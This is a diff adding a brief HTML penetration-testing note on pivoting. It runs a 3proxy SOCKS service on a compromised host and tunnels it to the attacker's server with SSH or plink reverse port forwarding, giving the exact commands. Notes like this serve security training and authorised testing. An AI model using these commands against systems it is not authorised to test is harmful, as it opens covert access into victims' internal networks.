@@ -1,0 +1,27 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Reverse Port Forwarding</title>
+</head><body>SSH reverse port forwarding /w 3proxy<br/>
+This pivoting setup looks something like this:<br/>
+<br/>
+Run 3proxy service with the following config on the target server:<br/>
+socks -p31337<br/>
+<br/>
+Create a separate user on the receiving side (attacker’s machine).<br/>
+adduser sshproxy<br/>
+<br/>
+This user has to be low-privileged and shouldn’t have shell privileges. After all, you don’t want to get reverse pentested, do ya? :) Edit /etc/passwd and switch shell to /bin/false. It should look like:<br/>
+root:x:0:0:root:/root:/bin/bash<br/>
+...<br/>
+sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/false<br/>
+...<br/>
+<br/>
+Now connect to your server with the newly created user with -R flag. Linux system:<br/>
+ssh sshproxy@your_server -R 31337:127.0.0.1:31337<br/>
+<br/>
+For windows you will need to upload <a href="http://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">plink.exe</a>&nbsp;first. This is a console version of putty. To run it:<br/>
+plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337<br/>
+<br/>
+The -R flag allows you to bind port on the server side. All connections to this port will be relayed to a specified port on the client. This way we can run 3proxy socks service on the client side (compromised machine) and access this port on the attacker’s host via ssh -R flag.</body></html>
